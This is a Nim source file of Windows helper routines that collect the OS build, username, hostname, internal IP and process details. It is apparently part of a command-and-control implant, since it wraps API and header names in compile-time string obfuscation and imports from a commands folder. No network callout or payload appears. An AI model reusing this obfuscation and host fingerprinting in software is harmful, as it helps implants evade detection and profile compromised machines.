from nativesockets import gethostbyname
from os import getCurrentProcessId, splitPath, getAppFilename, createDir, walkDir, splitPath, pcDir, `/`, removeDir
from winim/lean import CopyFileA, GetComputerNameW, winstrConverterStringToPtrChar
from winim/utils import `&`
import winim/inc/[windef, winbase]
import ../commands/whoami
import strenc

# https://github.com/nim-lang/Nim/issues/11481
type
  USHORT = uint16
  WCHAR = distinct int16
  UCHAR = uint8
  NTSTATUS = int32

type OSVersionInfoExW {.importc: obf("OSVERSIONINFOEXW"), header: obf("<windows.h>").} = object
  dwOSVersionInfoSize: ULONG
  dwMajorVersion: ULONG
  dwMinorVersion: ULONG
  dwBuildNumber: ULONG
  dwPlatformId: ULONG
  szCSDVersion: array[128, WCHAR]
  wServicePackMajor: USHORT
  wServicePackMinor: USHORT
  wSuiteMask: USHORT
  wProductType: UCHAR
  wReserved: UCHAR

# Import the rtlGetVersion API from NTDll
proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
  {.cdecl, importc: obf("RtlGetVersion"), dynlib: obf("ntdll.dll").}

# Get Windows build based on rtlGetVersion
proc getWindowsVersion*() : string =
    var
        versionInfo: OSVersionInfoExW

    discard rtlGetVersion(versionInfo)
    var vInfo = obf("Windows ") & $versionInfo.dwMajorVersion & obf(" build ") & $versionInfo.dwBuildNumber
    result = vInfo

# Define copyDir and moveDir functions to override os stdlib
# This fixes a bug where any function with using copyFile does not work with Win11 DLLs
# See: https://github.com/nim-lang/Nim/issues/21504
proc copyDir*(source, dest: string) =
    createDir(dest)
    for kind, path in walkDir(source):
        var 
            noSource = splitPath(path).tail
            dPath = dest / noSource
        if kind == pcDir:
            copyDir(path, dPath)
        else:
            CopyFileA(path, dPath, FALSE)

proc moveDir*(source, dest: string) =
    copydir(source, dest)
    removeDir(source)

# Get the username
proc getUsername*() : string = 
    result = whoami()

# Get the hostname
proc getHost*() : string = 
    var 
        buf : array[257, TCHAR]
        lpBuf :  LPWSTR = addr buf[0]
        pcbBuf : DWORD = int32(len(buf))
        
    discard GetComputerNameW(lpBuf, &pcbBuf)
    for character in buf:
        if character == 0: break
        result.add(char(character))

# Get the internal IP
proc getIntIp*() : string =
    result = $gethostbyname(getHost()).addrList[0]

# Get the current process ID
proc getProcId*() : int =
    result = getCurrentProcessId()

# Get the current process name
proc getProcName*() : string =
    splitPath(getAppFilename()).tail